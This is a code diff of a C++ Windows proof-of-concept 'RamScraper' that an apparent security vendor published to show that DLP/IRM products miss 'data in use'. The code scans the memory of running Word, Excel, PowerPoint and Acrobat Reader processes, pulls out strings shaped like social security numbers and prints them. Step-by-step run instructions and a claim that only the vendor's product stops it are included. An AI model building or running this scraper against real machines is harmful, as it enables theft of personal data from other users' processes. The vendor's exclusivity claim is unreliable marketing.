@@ -1,31 +1,82 @@
 /*
-	Basic, unoptimized, unhidden and purposefully noisy proof of concept RamScraper to atack "Data In Use".
-	The idea is to prove the point of how easy it is to defeat all current DLP/IRM products by attacking "Data In Use",
-	but not to help the bad guys build an optimized and stealthy attack tool. Therefore we are trying to evade DLP/IRM,
-	but deliberately be caught by EDR/AVs.
+	This is a basic, unoptimized, unhidden and purposefully noisy proof of concept RamScraper to attack “Data In Use”.
+	Data In Use is when a running application has a data open in memory and is operating on the data. Current DLP/IRM
+	products don’t protect data in use, leaving it vulnerable to RamScrapers such as this one. The idea of this
+	RamScraper is to prove how easy it is to defeat all current DLP/IRM products by attacking "Data In Use", but not
+	to help the bad guys build an optimized and stealthy attack tool. Therefore we are trying to evade DLP/IRM, but
+	are trying to deliberately be caught by EDR/AVs.
 
-	Insert A1FILO marketing here...
+	A1Logic’s A1FILO product uniquely protects data “In Use”, and also protects data at rest and in transit like other
+	DLP/IRM products on the market. Therefore A1FILO stops this RamScraper, but no other DLP/IRM product in the market
+	can stop this RamScraper.
 
-	s -u 0 L?0x7fffffff "222-22-2222"
+	This RamScraper reads the memory of running programs such as Microsoft Word, Excel, PowerPoint and Adobe Acrobat,
+	and looks for data resembling social security numbers. Specifically, this is data of the format:
+
+	XXX-XX-XXXX
+
+	Where X is any digit. Then, this RamScraper copies any matching data out of the memory of the running program and
+	prints it out.
+
+	Instructions:
+	1) Create and save files containing data in the format of social security numbers (SSNs) with each of the
+	aforementioned programs. These can even be fake SSNs as long as they follow the format.
+	2) Enable all your DLP/IRM products to maximum security, configured to encrypt sensitive data. For added effect,
+	encrypt the files containing sensitive data and maybe even encrypt your hard drive.
+	3) Open the various files containing social security numbers with their respective programs.
+	4) Run the RamScraper and watch it bypass the security of all your products and steal the “Data In Use”.
+
+	See www.A1Logic.com for more details about how to defend against this type of attack.
 */
 
 #include <Windows.h>
 #include <stdio.h>
 #include <processthreadsapi.h>
 #include <memoryapi.h>
+#include <Psapi.h>
+#include <stdexcept>
+
 
 #define PAGE_SIZE 4096
+#define NUMBER_PAGES 2
+
+#define LOCAL_BUFFER_COUNT_WCHARS ((NUMBER_PAGES * PAGE_SIZE)/sizeof(WCHAR))
+#define SSN L"000-00-0000"
+
+#define IMAGE_FILE_LARGE_ADDRESS_AWARE_MAX_ADDRESS 0x100000000
+
+PVOID localCopyPointer;
+HANDLE processHandle;
+
+// entire pattern must be < 4096 bytes
+inline WCHAR derefCharacter(PWCHAR ptr)
+{
+	PWCHAR localBuffer = (PWCHAR)localCopyPointer;
+	SIZE_T numBytesRead = 0;
+	UINT64 index = (UINT64)ptr / sizeof(WCHAR);
+	BOOL result;
+	static PWCHAR lastPtrCopied = (PWCHAR)-1;// we will never have upper bound of target VM search equal to 0xFFFFFFFF'FFFFFFFF
+
+	if ((UINT64)ptr % PAGE_SIZE == 0 && ptr != lastPtrCopied)// if ptr is ever page aligned and new...
+	{
+		// copy the remote page that ptr currently points to the base of...
+		result = ReadProcessMemory(processHandle, (PVOID)ptr, (PVOID)& localBuffer[index % LOCAL_BUFFER_COUNT_WCHARS], PAGE_SIZE, &numBytesRead);
+		if (!result || numBytesRead != PAGE_SIZE)
+			throw std::range_error("bad address");
+		lastPtrCopied = ptr;
+	}
+	return localBuffer[index % LOCAL_BUFFER_COUNT_WCHARS];
+}
 
 inline BOOL isDash(PWCHAR ptr)
 {
-	printf("%c ", *ptr);
-	return *ptr == '-';
+	return derefCharacter(ptr) == '-';
 }
 
 inline BOOL isDigit(PWCHAR ptr)
 {
-	printf("%c ", *ptr);
-	return *ptr >= '0' && *ptr <= '9';
+	WCHAR wcharValue = derefCharacter(ptr);
+	return wcharValue >= '0' && wcharValue <= '9';
 }
 
 BOOL isSocialSecurityNumber(PWCHAR ptr)
@@ -43,78 +94,103 @@ BOOL isSocialSecurityNumber(PWCHAR ptr)
 		isDigit(ptr++);
 }
 
-int main()
+int Name2PIDs(const WCHAR* processName, DWORD** returnedPIDs, size_t* numPidsFound)
 {
-	DWORD PID = 5692;
-	LPCVOID baseAddress = (PVOID)0x024d08aa;
-	PVOID localCopyPointer;
-	SIZE_T numBytesRead = 0;
-	BOOL result;
-	DWORD lastError;
-	int retVal = -1;
+	DWORD PIDs[1024], cbNeeded;
 
-	// write to windows event log
+	*returnedPIDs = NULL;
+	*numPidsFound = 0;
+	if (processName == NULL || !EnumProcesses(PIDs, sizeof(PIDs), &cbNeeded))
+		return 0;
 
-	localCopyPointer = VirtualAlloc(NULL, PAGE_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
-	if (!localCopyPointer)
-		return retVal;
-	HANDLE processHandle = OpenProcess(PROCESS_VM_READ, FALSE, PID);
-	if (!processHandle)
-		goto freeVM;
-	
-	/*
-	// ring scan algorithm
-	64BitPointer foreignPointer=0
-	64BitPointer localMappingBasePtr;
-	map foreignPointer page to arbitrary localMappingBasePtr
-	// map a guard page after 2nd page for debugging
-	for (foreignPointer < end of target memory)
+	// Find the Process of interest.
+	for (UINT PIDCounter = 0; PIDCounter < cbNeeded / sizeof(PIDs[0]); PIDCounter++)
 	{
-		__try
+		// Get the process handle.
+		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PIDs[PIDCounter]);
+		if (hProcess == NULL)
+			continue;
+
+		// Get the name of the process.
+		WCHAR currentProcessName[_MAX_FNAME];
+		DWORD retVal = GetProcessImageFileName(hProcess, currentProcessName, sizeof(currentProcessName) / sizeof(currentProcessName[0]));
+		CloseHandle(hProcess);
+		if (retVal == 0)
+			continue;
+
+		WCHAR* lastOccurence;
+		lastOccurence = wcsrchr(currentProcessName, L'\\');
+		if (lastOccurence && !wcsncmp(processName, lastOccurence+1, _MAX_FNAME))
 		{
-			if (foreignPointer % 2*PAGE_SIZE == 2nd page aligned)
-				mark 1st page as a guardpage
-			isSocialSecurityNumber(localMappingBasePtr[foreignPointer % 2*PAGE_SIZE]) // make sure isSocialSecurityNumber is also using our ring scheme with %2*PAGE_SIZE
-			foreignPointer++
-		}
-		__except(read_AV)
-		{
-			assert(ptr is page aligned) // this fault should only have occured at a page aligned boundary. which one?
-			if (foreignPointer % 2*PAGE_SIZE == 1st page aligned)
+			(*numPidsFound)++;
+			PVOID reallocRetVal = realloc(*returnedPIDs, sizeof(PIDs[0]) * (*numPidsFound));
+			if (reallocRetVal == NULL)
 			{
-				// we are starting at the bottom of the 1st page, so we know we will not need 2nd page
-				// anymore becuase SSN is not long. remap 2nd page now
+				free(*returnedPIDs);
+				*returnedPIDs = NULL;
+				return -1;
 			}
-			else if (foreignPointer % 2*PAGE_SIZE == 2nd page aligned)
-			{
-				// we are starting at the bottom of the 2nd page, so we know we will not need 1st page
-				// anymore becuase SSN is not long. remap 1st page now
-			}
-			map next page at current value of ptr since ptr deref is what just faulted
+			*returnedPIDs = (DWORD*)reallocRetVal;
+			(*returnedPIDs)[(*numPidsFound) - 1] = PIDs[PIDCounter];
 		}
 	}
-	*/
+	return 0;
+}
 
-	result = ReadProcessMemory(processHandle, (PVOID)baseAddress, localCopyPointer, PAGE_SIZE, &numBytesRead);
-	isSocialSecurityNumber((PWCHAR)localCopyPointer);
+int main()
+{
+	LPCWSTR logMessages[] = { L"A1Logic RAM Scraper Demo is bypassing DLP/IRM by attacking \"Data In Use\"" };
+	const WCHAR* targetProcessesArray[] = { L"WINWORD.EXE", L"AcroRd32.exe", L"EXCEL.EXE", L"POWERPNT.EXE" };
+	UINT targetProcessArrayElements = sizeof(targetProcessesArray) / sizeof(targetProcessesArray[0]);
+	PWCHAR current = (PWCHAR)0;
+	size_t numPids = 0;
+	int retVal = -1;
+	DWORD* PIDs;
 
-	/*for (PBYTE current = (PBYTE)baseAddress; current < (PBYTE)0x100000000; current += PAGE_SIZE)
+	HANDLE eventLogHandle = RegisterEventSourceA(NULL, "RamScraper");
+	ReportEvent(eventLogHandle, EVENTLOG_INFORMATION_TYPE, 0, 0, NULL, 1, 0, logMessages, 0);
+	DeregisterEventSource(eventLogHandle);
+
+	localCopyPointer = VirtualAlloc(NULL, NUMBER_PAGES * PAGE_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+	if (!localCopyPointer)
+		return retVal;
+
+	for (UINT targetProgramIndex = 0; targetProgramIndex < targetProcessArrayElements; targetProgramIndex++)
 	{
-		printf("scanning %p\n", current);
-		result = ReadProcessMemory(processHandle, (PVOID)current, localCopyPointer, PAGE_SIZE, &numBytesRead);
-		if (!result)
+		if (Name2PIDs(targetProcessesArray[targetProgramIndex], &PIDs, &numPids) == -1)
+			continue;
+		wprintf(L"%s:\n", targetProcessesArray[targetProgramIndex]);
+		for (UINT PIDCounter = 0; PIDCounter < numPids; PIDCounter++)
 		{
-			lastError = GetLastError();
-			printf("error %d\n", lastError);
+			processHandle = OpenProcess(PROCESS_VM_READ, FALSE, PIDs[PIDCounter]);
+			if (!processHandle)
+				continue;
+			//wprintf(L"%d:\n", PIDs[PIDCounter]);
+			current = 0;
+			while (current < (PWCHAR)IMAGE_FILE_LARGE_ADDRESS_AWARE_MAX_ADDRESS)
+			{
+				try
+				{
+					if (isSocialSecurityNumber(current))
+					{
+						for (UINT i = 0; i < (sizeof(SSN) / sizeof(WCHAR)) - 1; i++)
+							wprintf(L"%c", derefCharacter(current + i));
+						wprintf(L"\n");
+					}
+				}
+				catch (std::range_error e)
+				{
+					current = (PWCHAR)(((UINT64)current & (~(PAGE_SIZE - 1))) + PAGE_SIZE);
+					continue;
+				}
+				current++;
+			}
 		}
-		else
-			printf("memory at %p: %X\n", current, *(int*)localCopyPointer);
-	}*/
+		free(PIDs);
+		retVal = 0;
+		CloseHandle(processHandle);
+	}
 
-	retVal = 0;
-	CloseHandle(processHandle);
-freeVM:
 	VirtualFree(localCopyPointer, PAGE_SIZE, MEM_FREE);
-
 	return retVal;
 }
